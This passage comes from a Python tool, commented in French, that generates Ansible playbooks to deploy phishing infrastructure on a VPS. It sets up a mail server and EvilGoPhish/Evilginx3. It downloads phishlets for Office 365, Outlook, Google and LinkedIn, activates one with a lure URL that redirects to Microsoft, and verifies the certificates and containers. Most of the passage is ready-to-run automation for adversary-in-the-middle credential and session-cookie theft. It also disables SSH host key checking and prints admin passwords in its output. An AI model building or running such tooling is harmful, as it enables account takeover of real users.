        state: directory
        mode: "0700"

    - name: Réseau Docker {net} (créer si absent)
      ansible.builtin.shell: |
        docker network inspect {net} > /dev/null 2>&1 || \\
        docker network create --driver bridge --subnet {sub} {net}
      changed_when: false

    - name: Uploader cert SSL Origin (pem)
      ansible.builtin.copy:
        src: "{files_dir}/origin.crt"
        dest: /root/SSL/{c.domain}.pem.txt
        mode: "0600"

    - name: Uploader clé SSL Origin (key)
      ansible.builtin.copy:
        src: "{files_dir}/origin.key"
        dest: /root/SSL/{c.domain}.key.txt
        mode: "0600"
"""


def pb_mail(c: Config, files_dir: Path) -> str:
    d  = c.mail_dir
    s  = c.smtp_dir
    return f"""\
---
- name: "Mail Stack — configuration + déploiement"
  hosts: vps
  gather_facts: false
  tasks:
    # ── Configs MariaDB init ───────────────────────────────────────────────
    - name: init.sql MariaDB
      ansible.builtin.copy:
        src: "{files_dir}/mail/init.sql"
        dest: {d}/mysql/init.sql
        mode: "0644"

    # ── Dovecot configs ───────────────────────────────────────────────────
    - name: Dovecot Dockerfile
      ansible.builtin.copy:
        src: "{files_dir}/mail/dovecot/Dockerfile"
        dest: {d}/dovecot/Dockerfile

    - name: dovecot.conf
      ansible.builtin.copy:
        src: "{files_dir}/mail/dovecot/dovecot.conf"
        dest: {d}/dovecot/dovecot.conf

    - name: dovecot-sql.conf.ext
      ansible.builtin.copy:
        src: "{files_dir}/mail/dovecot/dovecot-sql.conf.ext"
        dest: {d}/dovecot/dovecot-sql.conf.ext
        mode: "0600"

    - name: conf.d 10-auth.conf
      ansible.builtin.copy:
        src: "{files_dir}/mail/dovecot/conf.d/10-auth.conf"
        dest: "{d}/dovecot/conf.d/10-auth.conf"
    - name: conf.d 10-mail.conf
      ansible.builtin.copy:
        src: "{files_dir}/mail/dovecot/conf.d/10-mail.conf"
        dest: "{d}/dovecot/conf.d/10-mail.conf"
    - name: conf.d 10-master.conf
      ansible.builtin.copy:
        src: "{files_dir}/mail/dovecot/conf.d/10-master.conf"
        dest: "{d}/dovecot/conf.d/10-master.conf"
    - name: conf.d 20-lmtp.conf
      ansible.builtin.copy:
        src: "{files_dir}/mail/dovecot/conf.d/20-lmtp.conf"
        dest: "{d}/dovecot/conf.d/20-lmtp.conf"
    - name: conf.d auth-sql.conf.ext
      ansible.builtin.copy:
        src: "{files_dir}/mail/dovecot/conf.d/auth-sql.conf.ext"
        dest: "{d}/dovecot/conf.d/auth-sql.conf.ext"

    # ── PostfixAdmin PHP ini (supprime warnings PHP 8.x) ──────────────────
    - name: PostfixAdmin PHP ini
      ansible.builtin.copy:
        src: "{files_dir}/mail/postfixadmin-php.ini"
        dest: {d}/postfixadmin-php.ini

    # ── Roundcube config ──────────────────────────────────────────────────
    - name: Roundcube config.inc.php
      ansible.builtin.copy:
        src: "{files_dir}/mail/roundcube-config/config.inc.php"
        dest: {d}/roundcube-config/config.inc.php

    # ── Postfix MySQL lookups ─────────────────────────────────────────────
    - name: Postfix virtual-domains.cf
      ansible.builtin.copy:
        src: "{files_dir}/mail/smtp/mysql/virtual-domains.cf"
        dest: "{s}/mysql/virtual-domains.cf"
        mode: "0640"
    - name: Postfix virtual-mailboxes.cf
      ansible.builtin.copy:
        src: "{files_dir}/mail/smtp/mysql/virtual-mailboxes.cf"
        dest: "{s}/mysql/virtual-mailboxes.cf"
        mode: "0640"
    - name: Postfix virtual-aliases.cf
      ansible.builtin.copy:
        src: "{files_dir}/mail/smtp/mysql/virtual-aliases.cf"
        dest: "{s}/mysql/virtual-aliases.cf"
        mode: "0640"

    # ── Docker Compose files ──────────────────────────────────────────────
    - name: mailstack docker-compose.yml
      ansible.builtin.copy:
        src: "{files_dir}/mail/mailstack-compose.yml"
        dest: {d}/docker-compose.yml

    - name: smtp docker-compose.yml
      ansible.builtin.copy:
        src: "{files_dir}/mail/smtp-compose.yml"
        dest: {s}/docker-compose.yml

    # ── Build Dovecot ─────────────────────────────────────────────────────
    - name: Vérifier image dovecot-custom:local
      ansible.builtin.command: docker image inspect dovecot-custom:local
      register: dovecot_img
      failed_when: false
      changed_when: false

    - name: Builder image Dovecot (si absente)
      ansible.builtin.command: docker build -t dovecot-custom:local {d}/dovecot
      when: dovecot_img.rc != 0
      async: 300
      poll: 10

    # ── Démarrage ─────────────────────────────────────────────────────────
    - name: Démarrer mailstack (maildb + dovecot + postfixadmin + roundcube)
      ansible.builtin.command:
        cmd: docker compose -f {d}/docker-compose.yml up -d
      changed_when: true

    - name: Attendre MariaDB (15s)
      ansible.builtin.pause:
        seconds: 15

    - name: Démarrer smtp (Postfix)
      ansible.builtin.command:
        cmd: docker compose -f {s}/docker-compose.yml up -d
      changed_when: true
"""


def pb_postfixadmin_setup(c: Config) -> str:
    domain = c.domain
    admin  = c.get("mail", "postfixadmin_admin_email", default=f"admin@{domain}")
    pw     = c.get("mail", "postfixadmin_admin_password", default="")
    db     = c.get("mail", "db_name", default="mailserver")
    dbuser = c.get("mail", "db_user", default="mailuser")
    dbpw   = c.get("mail", "db_password", default="")
    # Escape for PHP single-quoted string (inside shell double-quoted argument)
    pw_php = pw.replace("\\", "\\\\").replace("'", "\\'")
    pfa_port = c.get("mail", "port_postfixadmin", default=8026)
    return f"""\
---
- name: "PostfixAdmin — configuration domaine + compte admin"
  hosts: vps
  gather_facts: false
  tasks:
    # ── Étape 1 : MariaDB prête ────────────────────────────────────────────
    - name: Attendre que MariaDB soit prête
      ansible.builtin.shell: |
        docker exec maildb mysqladmin ping -u'{dbuser}' -p'{dbpw}' --silent
      register: db_ping
      retries: 24
      delay: 5
      until: db_ping.rc == 0
      changed_when: false

    # ── Étape 2 : PostfixAdmin HTTP prêt (initialise aussi le schéma DB) ──
    - name: Attendre que PostfixAdmin réponde HTTP 200
      ansible.builtin.uri:
        url: "http://127.0.0.1:{pfa_port}/login.php"
        method: GET
        status_code: 200
      register: pfa_http
      retries: 24
      delay: 5
      until: pfa_http.status == 200
      failed_when: false

    # ── Étape 3 : Attendre que PostfixAdmin ait créé la table admin ────────
    - name: Attendre que la table admin existe dans MariaDB
      ansible.builtin.shell: |
        docker exec maildb mysql -u'{dbuser}' -p'{dbpw}' {db} \
          -sNe "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db}' AND table_name='admin';"
      register: tbl_check
      retries: 12
      delay: 5
      until: tbl_check.stdout | trim == "1"
      changed_when: false

    # ── Étape 4 : Créer le domaine virtuel ────────────────────────────────
    - name: Créer domaine virtuel {domain}
      ansible.builtin.shell: |
        docker exec maildb mysql -u'{dbuser}' -p'{dbpw}' {db} -e "
          INSERT IGNORE INTO domain
            (domain, description, aliases, mailboxes, maxquota, quota, transport, backupmx, created, modified, active)
          VALUES
            ('{domain}', '{domain}', 0, 0, 0, 0, 'virtual', 0, NOW(), NOW(), 1);
        "
      changed_when: true

    # ── Étape 5 : Créer admin + mailbox + alias + domain_admins ─────────────
    - name: Créer compte admin PostfixAdmin
      ansible.builtin.shell: |
        HASH=$(docker exec postfixadmin php -r "echo password_hash('{pw_php}', PASSWORD_BCRYPT);")
        docker exec maildb mysql -u'{dbuser}' -p'{dbpw}' {db} -e \
          "INSERT INTO admin (username,password,superadmin,created,modified,active) VALUES ('{admin}','$HASH',1,NOW(),NOW(),1) ON DUPLICATE KEY UPDATE password='$HASH',superadmin=1,active=1,modified=NOW();"
        docker exec maildb mysql -u'{dbuser}' -p'{dbpw}' {db} -e \
          "INSERT INTO mailbox (username,password,name,maildir,quota,local_part,domain,created,modified,active) VALUES ('{admin}','$HASH','Admin','{domain}/admin/',0,'admin','{domain}',NOW(),NOW(),1) ON DUPLICATE KEY UPDATE password='$HASH',active=1,modified=NOW();"
        docker exec maildb mysql -u'{dbuser}' -p'{dbpw}' {db} -e \
          "INSERT IGNORE INTO alias (address,goto,domain,created,modified,active) VALUES ('dmarc@{domain}','{admin}','{domain}',NOW(),NOW(),1);"
        docker exec maildb mysql -u'{dbuser}' -p'{dbpw}' {db} -e \
          "INSERT IGNORE INTO domain_admins (username,domain,created,active) VALUES ('{admin}','{domain}',NOW(),1);"
      changed_when: true

    # ── Étape 6 : Vérifier et afficher résultat ───────────────────────────
    - name: Vérifier admin créé
      ansible.builtin.shell: |
        docker exec maildb mysql -u'{dbuser}' -p'{dbpw}' {db} -sNe \
          "SELECT username, superadmin, active FROM admin WHERE username='{admin}';"
      register: admin_result
      changed_when: false

    - name: Résultat final
      ansible.builtin.debug:
        msg:
          - "✓ PostfixAdmin configuré"
          - "Admin: {{ admin_result.stdout_lines }}"
          - "URL: http://127.0.0.1:{pfa_port}/login.php"
          - "Login: {admin}"
          - "Password: {pw}"
"""


def pb_evilgophish(c: Config, files_dir: Path) -> str:
    eg = c.eg_dir

    if c.use_local_repos:
        repo_tasks = f"""\
    # ── Source locale (repo unique fusionné) ──────────────────────────────
    - name: Créer répertoire source dans build/
      ansible.builtin.file:
        path: {eg}/build/repo_src
        state: directory
        mode: "0755"

    - name: Uploader archive repo_src
      ansible.builtin.copy:
        src: "{files_dir}/evilgophish/build/repo_src.tar.gz"
        dest: {eg}/build/repo_src.tar.gz

    - name: Extraire repo_src
      ansible.builtin.unarchive:
        src: {eg}/build/repo_src.tar.gz
        dest: {eg}/build/repo_src/
        remote_src: true
"""
        phishlet_tasks = f"""\
    # ── Copier phishlets depuis repo_src/evilginx3 ────────────────────────
    - name: Copier phishlets depuis repo local
      ansible.builtin.shell: |
        cp {eg}/build/repo_src/evilginx3/legacy_phishlets/*.yaml {eg}/phishlets/ 2>/dev/null || true
        ls {eg}/phishlets/
      changed_when: true
"""
    else:
        repo_tasks = ""
        phishlet_tasks = f"""\
    # ── Télécharger phishlets (Yomgui33/evil_temp legacy_phishlets) ─────────
    - name: Télécharger phishlets depuis Yomgui33/evil_temp
      ansible.builtin.shell: |
        BASE="https://raw.githubusercontent.com/Yomgui33/evil_temp/main/legacy_phishlets"
        for p in o365.yaml o3652.yaml outlook.yaml google.yaml linkedin.yaml; do
          curl -fsSL --max-time 15 -o {eg}/phishlets/$p "$BASE/$p" 2>/dev/null || true
        done
        ls {eg}/phishlets/
      register: phishlet_dl
      changed_when: true
      ignore_errors: true
"""

    return f"""\
---
- name: "EvilGoPhish — build + déploiement"
  hosts: vps
  gather_facts: false
  tasks:
    # ── Fichiers de build ─────────────────────────────────────────────────
    - name: Dockerfile
      ansible.builtin.copy:
        src: "{files_dir}/evilgophish/build/Dockerfile"
        dest: {eg}/build/Dockerfile

    - name: supervisord.conf
      ansible.builtin.copy:
        src: "{files_dir}/evilgophish/build/supervisord.conf"
        dest: {eg}/build/supervisord.conf

    - name: entrypoint.sh
      ansible.builtin.copy:
        src: "{files_dir}/evilgophish/build/entrypoint.sh"
        dest: {eg}/build/entrypoint.sh
        mode: "0755"

    - name: config.json Evilginx3
      ansible.builtin.copy:
        src: "{files_dir}/evilgophish/evilginx-config/config.json"
        dest: {eg}/evilginx-config/config.json

    - name: docker-compose.yml EvilGoPhish
      ansible.builtin.copy:
        src: "{files_dir}/evilgophish/docker-compose.yml"
        dest: {eg}/docker-compose.yml

    - name: GoPhish config.json
      ansible.builtin.copy:
        src: "{files_dir}/evilgophish/data/config.json"
        dest: {eg}/data/config.json
        mode: "0644"

    - name: Script activation phishlet
      ansible.builtin.copy:
        src: "{files_dir}/evilgophish/activate_phishlet.py"
        dest: {eg}/activate_phishlet.py
        mode: "0755"

    # ── Certs Cloudflare Origin par sous-domaine ──────────────────────────
    - name: Créer répertoires certs par sous-domaine
      ansible.builtin.file:
        path: "{eg}/evilginx-config/crt/sites/{{{{ item }}}}.{c.domain}"
        state: directory
        mode: "0755"
      loop: {json.dumps(c.subdomains)}

    - name: Installer cert .crt par sous-domaine
      ansible.builtin.copy:
        src: "{files_dir}/origin.crt"
        dest: "{eg}/evilginx-config/crt/sites/{{{{ item }}}}.{c.domain}/{{{{ item }}}}.{c.domain}.crt"
        mode: "0644"
      loop: {json.dumps(c.subdomains)}

    - name: Installer clé .key par sous-domaine
      ansible.builtin.copy:
        src: "{files_dir}/origin.key"
        dest: "{eg}/evilginx-config/crt/sites/{{{{ item }}}}.{c.domain}/{{{{ item }}}}.{c.domain}.key"
        mode: "0600"
      loop: {json.dumps(c.subdomains)}

    # ── Copier SSL dans build/ (référencé dans certains Dockerfiles) ──────
    - name: Copier cert dans build/cf.crt
      ansible.builtin.copy:
        src: /root/SSL/{c.domain}.pem.txt
        dest: {eg}/build/cf.crt
        remote_src: true

    - name: Copier clé dans build/cf.key
      ansible.builtin.copy:
        src: /root/SSL/{c.domain}.key.txt
        dest: {eg}/build/cf.key
        remote_src: true
        mode: "0600"

{repo_tasks}
    # ── Build (peut prendre 5-15 min) ─────────────────────────────────────
    - name: Build image evilgophish:local
      ansible.builtin.command:
        cmd: docker compose -f {eg}/docker-compose.yml build --no-cache evilgophish
        chdir: {eg}
      async: 900
      poll: 30
      changed_when: true

    - name: Copier phishlets bundlés vers répertoire persistant
      ansible.builtin.shell: |
        if [ -d /tmp/eg_phishlets_tmp ]; then rm -rf /tmp/eg_phishlets_tmp; fi
        docker run --rm --entrypoint=sh evilgophish:local -c \
          "cp -r /opt/evilgophish/evilginx3/phishlets-bundled /tmp/phishlets_out 2>/dev/null; ls /tmp/phishlets_out 2>/dev/null || true"
        docker run --rm -v {eg}/phishlets:/target --entrypoint=sh evilgophish:local -c \
          "cp /opt/evilgophish/evilginx3/phishlets-bundled/*.yaml /target/ 2>/dev/null || true; ls /target/"
      register: phishlets_copy
      changed_when: true
      ignore_errors: true

    # ── Libérer port 53 (systemd-resolved / dnsmasq / named / autre) ────────
    - name: Libérer port 53 (kill tout process qui l'occupe)
      ansible.builtin.shell: |
        systemctl stop systemd-resolved 2>/dev/null || true
        systemctl disable systemd-resolved 2>/dev/null || true
        systemctl stop dnsmasq 2>/dev/null || true
        systemctl stop named  2>/dev/null || true
        systemctl stop bind9  2>/dev/null || true
        fuser -k 53/tcp 2>/dev/null || true
        fuser -k 53/udp 2>/dev/null || true
        sleep 1
        rm -f /etc/resolv.conf
        printf 'nameserver 8.8.8.8\\nnameserver 1.1.1.1\\n' > /etc/resolv.conf
      changed_when: false

{phishlet_tasks}
    # ── Démarrage ─────────────────────────────────────────────────────────
    - name: Démarrer conteneur evilgophish
      ansible.builtin.command:
        cmd: docker compose -f {eg}/docker-compose.yml up -d
        chdir: {eg}
      changed_when: true

    - name: Attendre démarrage supervisord (15s)
      ansible.builtin.pause:
        seconds: 15
"""


def pb_activate_phishlet(c: Config) -> str:
    phishlet = c.get("evilgophish", "phishlet",          default="o365")
    hostname = c.get("evilgophish", "phishlet_hostname", default=f"login.{c.domain}")
    lure_path = c.get("evilgophish", "lure_path",        default="/secure")
    unauth   = c.get("evilgophish", "unauth_url",        default="https://www.microsoft.com")
    return f"""\
---
- name: "Evilginx3 — activation phishlet + lure"
  hosts: vps
  gather_facts: false
  tasks:
    - name: Arrêter evilginx3 pour configuration
      ansible.builtin.command:
        cmd: docker exec evilgophish supervisorctl stop evilginx3
      changed_when: true
      ignore_errors: true

    - name: Attendre arrêt evilginx3 (2s)
      ansible.builtin.pause:
        seconds: 2

    - name: Écrire script activation phishlet sur le VPS
      ansible.builtin.copy:
        dest: /tmp/activate_phishlet.py
        content: |
          import json
          PHISHLET  = '{phishlet}'
          HOSTNAME  = '{hostname}'
          REDIRECT  = '{unauth}'
          LURE_PATH = '{lure_path}'
          CFG = '/root/.evilginx/config.json'
          with open(CFG) as f:
              cfg = json.load(f)
          for k in list(cfg.get('phishlets', {{}})):
              cfg['phishlets'][k] = {{'hostname': '', 'unauth_url': '', 'enabled': False, 'visible': False}}
          cfg.setdefault('phishlets', {{}})[PHISHLET] = {{
              'hostname': HOSTNAME, 'unauth_url': '', 'enabled': True, 'visible': True
          }}
          cfg['lures'] = [{{
              'path': LURE_PATH, 'phishlet': PHISHLET, 'redirect_url': REDIRECT,
              'paused': 0, 'hostname': '', 'id': '', 'info': '',
              'og_desc': '', 'og_image': '', 'og_title': '', 'og_url': '',
              'redirector': '', 'ua_filter': ''
          }}]
          with open(CFG, 'w') as f:
              json.dump(cfg, f, indent=2)
          print('[+] Phishlet', PHISHLET, '| hostname:', HOSTNAME, '| lure:', LURE_PATH)

    - name: Copier script dans container et activer phishlet (pass 1)
      ansible.builtin.shell: |
        docker cp /tmp/activate_phishlet.py evilgophish:/tmp/activate_phishlet.py
        docker exec evilgophish python3 /tmp/activate_phishlet.py
      register: activate_result_1
      changed_when: true

    - name: Résultat activation (pass 1)
      ansible.builtin.debug:
        msg: "{{{{ activate_result_1.stdout_lines }}}}"

    - name: Démarrer evilginx3 (pass 1 — initialise les entrées phishlets)
      ansible.builtin.command:
        cmd: docker exec evilgophish supervisorctl start evilginx3
      changed_when: true

    - name: Attendre initialisation evilginx3 (8s)
      ansible.builtin.pause:
        seconds: 8

    - name: Arrêter evilginx3 (pass 2)
      ansible.builtin.command:
        cmd: docker exec evilgophish supervisorctl stop evilginx3
      changed_when: true
      ignore_errors: true

    - name: Ré-activer phishlet (pass 2 — double restart requis pour valider le hostname)
      ansible.builtin.shell: |
        docker exec evilgophish python3 /tmp/activate_phishlet.py
      register: activate_result_2
      changed_when: true

    - name: Résultat activation (pass 2)
      ansible.builtin.debug:
        msg: "{{{{ activate_result_2.stdout_lines }}}}"

    - name: Démarrer evilginx3 (pass 2 — démarrage final)
      ansible.builtin.command:
        cmd: docker exec evilgophish supervisorctl start evilginx3
      changed_when: true

    - name: Attendre démarrage final (8s)
      ansible.builtin.pause:
        seconds: 8

    - name: Vérifier logs evilginx3 post-activation
      ansible.builtin.shell: |
        docker exec evilgophish tail -20 /var/log/evilgophish/evilginx3.log
      register: eg_logs
      changed_when: false
      failed_when: false

    - name: Logs evilginx3
      ansible.builtin.debug:
        msg: "{{{{ eg_logs.stdout_lines }}}}"
"""


def pb_verify(c: Config) -> str:
    eg     = c.eg_dir
    domain = c.domain
    vps_ip = c.vps_ip
    sub0   = c.subdomains[0] if c.subdomains else "login"
    port_rc  = c.get("mail", "port_roundcube",    default=8025)
    port_pfa = c.get("mail", "port_postfixadmin", default=8026)
    return f"""\
---
- name: "Vérifications finales"
  hosts: vps
  gather_facts: false
  tasks:
    - name: État des conteneurs Docker
      ansible.builtin.command: docker ps
      register: docker_ps
      changed_when: false

    - name: Afficher conteneurs
      ansible.builtin.debug:
        msg: "{{{{ docker_ps.stdout_lines }}}}"

    - name: Processus supervisord dans evilgophish
      ansible.builtin.command: docker exec evilgophish supervisorctl status
      register: sv_status
      failed_when: false
      changed_when: false

    - name: Afficher supervisord status
      ansible.builtin.debug:
        msg: "{{{{ sv_status.stdout_lines }}}}"

    - name: Vérifier port 443 dans le conteneur
      ansible.builtin.command: docker exec evilgophish ss -tlnp
      register: ports_443
      changed_when: false

    - name: Vérifier cert Origin servi sur VPS (bypass Cloudflare)
      ansible.builtin.shell: |
        echo | openssl s_client -connect {vps_ip}:443 -servername {sub0}.{domain} 2>/dev/null | \\
        openssl x509 -noout -issuer 2>/dev/null || echo "CERT_NOT_READY"
      register: cert_check
      changed_when: false
      failed_when: false

    - name: Résultat cert Origin
      ansible.builtin.debug:
        msg: "{{{{ cert_check.stdout | trim }}}}"

    - name: Vérifier smtpd_sender_restrictions Postfix
      ansible.builtin.command: docker exec smtp postconf smtpd_sender_restrictions
      register: postfix_check
      failed_when: false
      changed_when: false

    - name: Afficher Postfix restrictions
      ansible.builtin.debug:
        msg: "{{{{ postfix_check.stdout | trim }}}}"

    - name: Résumé déploiement
      ansible.builtin.debug:
        msg:
          - "════════════════════════════════════════════"
          - " Déploiement terminé — {domain}"
          - "════════════════════════════════════════════"
          - " GoPhish    : http://localhost:3333 (SSH tunnel)"
          - " Roundcube  : http://{vps_ip}:{port_rc}"
          - " PostfixAdmin: http://127.0.0.1:{port_pfa} (SSH tunnel)"
          - " Evilginx3  : https://{sub0}.{domain}"
          - "════════════════════════════════════════════"
          - " DNS Cloudflare requis :"
"""


# ══════════════════════════════════════════════════════════════════════════════
#  DESTROY
# ══════════════════════════════════════════════════════════════════════════════

ALL_SERVICES = ["evilgophish", "mailstack", "smtp"]


def pb_destroy(c: Config, services: list, purge_dirs: bool) -> str:
    eg  = c.eg_dir
    d   = c.mail_dir
    s   = c.smtp_dir
    net = c.net

    do_eg   = "evilgophish" in services
    do_mail = "mailstack"   in services
    do_smtp = "smtp"        in services
    do_net  = set(services) >= set(ALL_SERVICES)  # réseau seulement si tout supprimé

    tasks = ['---', '- name: "Destroy — suppression infrastructure"', '  hosts: vps', '  gather_facts: false', '  tasks:']

    # ── EvilGoPhish ───────────────────────────────────────────────────────
    if do_eg:
        tasks.append(f"""\
    - name: Arrêter et supprimer conteneur evilgophish
      ansible.builtin.shell: |
        docker compose -f {eg}/docker-compose.yml down --remove-orphans 2>/dev/null || true
        docker rm -f evilgophish 2>/dev/null || true
      changed_when: false

    - name: Supprimer image evilgophish:local
      ansible.builtin.shell: docker rmi -f evilgophish:local 2>/dev/null || true
      changed_when: false""")
        if purge_dirs:
            tasks.append(f"""\
    - name: Supprimer répertoire {eg}
      ansible.builtin.file:
        path: {eg}
        state: absent""")

    # ── Mailstack ─────────────────────────────────────────────────────────
    if do_mail:
        tasks.append(f"""\
    - name: Arrêter et supprimer mailstack (maildb/dovecot/postfixadmin/roundcube)
      ansible.builtin.shell: |
        docker compose -f {d}/docker-compose.yml down --remove-orphans -v 2>/dev/null || true
        for c in maildb dovecot postfixadmin roundcube; do
          docker rm -f $c 2>/dev/null || true
        done
      changed_when: false

    - name: Supprimer image dovecot-custom:local
      ansible.builtin.shell: docker rmi -f dovecot-custom:local 2>/dev/null || true
      changed_when: false""")
        if purge_dirs:
            tasks.append(f"""\
    - name: Supprimer répertoire {d}
      ansible.builtin.file:
        path: {d}
        state: absent""")

    # ── SMTP ──────────────────────────────────────────────────────────────
    if do_smtp:
        tasks.append(f"""\
    - name: Arrêter et supprimer conteneur smtp
      ansible.builtin.shell: |
        docker compose -f {s}/docker-compose.yml down --remove-orphans 2>/dev/null || true
        docker rm -f smtp 2>/dev/null || true
      changed_when: false""")
        if purge_dirs:
            tasks.append(f"""\
    - name: Supprimer répertoire {s}
      ansible.builtin.file:
        path: {s}
        state: absent""")

    # ── Réseau Docker ─────────────────────────────────────────────────────
    if do_net:
        tasks.append(f"""\
    - name: Supprimer réseau Docker {net}
      ansible.builtin.shell: docker network rm {net} 2>/dev/null || true
      changed_when: false""")

    # ── Images orphelines ─────────────────────────────────────────────────
    tasks.append("""\
    - name: Nettoyer images Docker orphelines
      ansible.builtin.shell: docker image prune -f 2>/dev/null || true
      changed_when: false

    - name: Résumé destroy
      ansible.builtin.debug:
        msg: "Suppression terminée — services : """ + str(services) + """"
""")

    return "\n".join(tasks)


def run_destroy(c: Config, args):
    services = args.services if args.services else ALL_SERVICES
    unknown  = [s for s in services if s not in ALL_SERVICES]
    if unknown:
        die(f"Services inconnus : {', '.join(unknown)}\n  → Valeurs valides : {', '.join(ALL_SERVICES)}")

    purge = args.purge_dirs

    if not shutil.which("ansible-playbook"):
        die("ansible-playbook introuvable.\n  → pip3 install ansible")
    if not c.local and not c.ssh_key:
        die("vps.ssh_key requis pour le mode SSH.")

    log_warn(f"DESTROY — services ciblés : {', '.join(services)}")
    if purge:
        log_warn("--purge-dirs activé : les répertoires sur le serveur seront supprimés !")
    print()

    confirm = input(
        f"{C.RED}{C.BOLD}Confirmer la suppression ? [oui/N] {C.RST}"
    ).strip().lower()
    if confirm not in ("oui", "o", "yes", "y"):
        log_warn("Annulé.")
        sys.exit(0)

    ws = AnsibleWorkspace(c)
    runner = AnsibleRunner(ws, c)
    try:
        playbook = pb_destroy(c, services, purge)
        ok = runner.run(playbook, "destroy", timeout=300)
        if ok:
            log_ok("Infrastructure supprimée.")
        else:
            log_error("Échec partiel — vérifiez la sortie ci-dessus.")
            sys.exit(1)
    finally:
        if args.keep_workspace:
            log_info(f"Workspace conservé : {ws.dir}")
        else:
            ws.cleanup()


# ══════════════════════════════════════════════════════════════════════════════
#  RUNNER ANSIBLE
# ══════════════════════════════════════════════════════════════════════════════

class AnsibleRunner:
    def __init__(self, ws: AnsibleWorkspace, c: Config):
        self.ws      = ws
        self.c       = c
        self.inv     = str(ws.inventory())
        self.verbose = c.verbose
        self.dry_run = c.dry_run

    def run(self, playbook_content: str, step_name: str, timeout: int = 900) -> bool:
        pb_path = self.ws.write(f"pb_{step_name.replace(' ', '_')}.yml", playbook_content)

        cmd = [
            "ansible-playbook",
            "-i", self.inv,
            str(pb_path),
        ]
        if self.verbose:
            cmd.append("-v")

        if self.dry_run:
            log_warn(f"[DRY-RUN] ansible-playbook {pb_path.name}")
            log_warn("Contenu du playbook :")
            print(pb_path.read_text())
            return True

        log_info(f"Exécution : {' '.join(cmd)}")

        env = os.environ.copy()
        env["ANSIBLE_HOST_KEY_CHECKING"] = "False"
        env["ANSIBLE_STDOUT_CALLBACK"]   = "yaml"
        env.setdefault("ANSIBLE_FORCE_COLOR", "1")

        try:
            result = subprocess.run(
                cmd,
                env=env,
                timeout=timeout,
                text=True,
                capture_output=not self.verbose,
            )
        except subprocess.TimeoutExpired:
            log_error(f"Timeout ({timeout}s) dépassé pour l'étape : {step_name}")
            return False
        except FileNotFoundError:
            die("ansible-playbook introuvable. Installez Ansible : pip3 install ansible")

        if result.returncode != 0:
            log_error(f"Échec étape '{step_name}' (code {result.returncode})")
            if not self.verbose and result.stderr:
                print(result.stderr[-3000:], file=sys.stderr)
            if not self.verbose and result.stdout:
                print(result.stdout[-3000:], file=sys.stderr)
            return False

        log_ok(f"Étape '{step_name}' — OK")
        return True


# ══════════════════════════════════════════════════════════════════════════════
#  PRÉFLIGHT LOCAL
# ══════════════════════════════════════════════════════════════════════════════

def check_prerequisites(c: Config):
    log_info("Vérification des prérequis locaux...")

    # Ansible
    if not shutil.which("ansible-playbook"):
        die("ansible-playbook introuvable.\n  → pip3 install ansible")

    # SSH key (ignoré en mode --local)
    if not c.local:
        ssh_key = Path(c.ssh_key)
        if not ssh_key.exists():
            die(f"Clé SSH introuvable : {c.ssh_key}")
        if oct(ssh_key.stat().st_mode)[-3:] not in ("600", "400"):
            log_warn(f"Permissions clé SSH incorrectes ({ssh_key}) — recommandé : chmod 600")

    # SSL certs (seulement si déploiement mail ou evilgophish)
    if c.mail_deploy or c.eg_deploy:
        if not Path(c.ssl_cert).exists():
            die(f"Cert SSL introuvable : {c.ssl_cert}\n  → Générez-le dans Cloudflare Dashboard → SSL/TLS → Origin Server")
        if not Path(c.ssl_key).exists():
            die(f"Clé SSL introuvable : {c.ssl_key}")

    # PyYAML déjà vérifié à l'import
    log_ok("Prérequis locaux OK")


def check_vps_connectivity(c: Config) -> bool:
    log_info(f"Test connectivité SSH vers {c.vps_host}:{c.ssh_port}...")
    cmd = [
        "ssh",
        "-i", c.ssh_key,
        "-p", str(c.ssh_port),
        "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=10",
        "-o", "BatchMode=yes",
        f"{c.vps_user}@{c.vps_host}",
        "echo OK",
    ]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        if r.returncode == 0 and "OK" in r.stdout:
            log_ok(f"SSH OK → {c.vps_user}@{c.vps_host}")
            return True
        log_error(f"SSH échoué : {r.stderr.strip()}")
        return False
    except subprocess.TimeoutExpired:
        log_error("Timeout SSH")
        return False


# ══════════════════════════════════════════════════════════════════════════════
#  DÉFINITION DES ÉTAPES
# ══════════════════════════════════════════════════════════════════════════════

STEP_NAMES = [
    "preflight",
    "docker",
    "structure",
    "mail",
    "postfixadmin",
    "evilgophish",
    "phishlet",
    "verify",
]


def build_steps(c: Config, ws: AnsibleWorkspace):
    """Retourne la liste des (nom, playbook_str, timeout) à exécuter."""
    f = ws.files_dir
    steps = [
        ("preflight",     pb_preflight(),                   60),
        ("docker",        pb_docker(),                      300),
        ("structure",     pb_structure(c, f),               120),
    ]
    if c.mail_deploy:
        steps += [
            ("mail",          pb_mail(c, f),                    600),
            ("postfixadmin",  pb_postfixadmin_setup(c),         120),
        ]
    if c.eg_deploy:
        steps += [
            ("evilgophish",   pb_evilgophish(c, f),             1200),
            ("phishlet",      pb_activate_phishlet(c),          60),
        ]
    steps.append(("verify", pb_verify(c), 120))
    return steps


# ══════════════════════════════════════════════════════════════════════════════
#  AFFICHAGE BANNER
# ══════════════════════════════════════════════════════════════════════════════

def print_banner(c: Config, destroy: bool = False, services: list = None):
    mail_flag = "✔ activé" if c.mail_deploy else "✘ ignoré"
    eg_flag   = "✔ activé" if c.eg_deploy   else "✘ ignoré"
    dr_flag   = f"{C.YLW}DRY-RUN{C.RST}" if c.dry_run else f"{C.GRN}LIVE{C.RST}"
    conn_flag = f"{C.MAG}LOCAL (sans SSH){C.RST}" if c.local else f"{c.vps_user}@{c.vps_host}:{c.ssh_port}"
    if destroy:
        dr_flag = f"{C.RED}{C.BOLD}DESTROY — {', '.join(services or ALL_SERVICES)}{C.RST}"
    print(f"""
{C.CYN}{C.BOLD}╔══════════════════════════════════════════════════════════════╗
║            DÉPLOIEMENT INFRASTRUCTURE PHISHING               ║
╚══════════════════════════════════════════════════════════════╝{C.RST}

  {C.BOLD}VPS          :{C.RST}  {conn_flag}
  {C.BOLD}Domaine      :{C.RST}  {c.domain}
  {C.BOLD}VPS IP       :{C.RST}  {c.vps_ip}
  {C.BOLD}Sous-domaines:{C.RST}  {', '.join(f'{s}.{c.domain}' for s in c.subdomains)}
  {C.BOLD}Stack Mail   :{C.RST}  {mail_flag}
  {C.BOLD}EvilGoPhish  :{C.RST}  {eg_flag}
  {C.BOLD}Mode         :{C.RST}  {dr_flag}
""")


def print_post_deploy_checklist(c: Config):
    subs   = c.subdomains
    ip     = c.vps_ip
    domain = c.domain
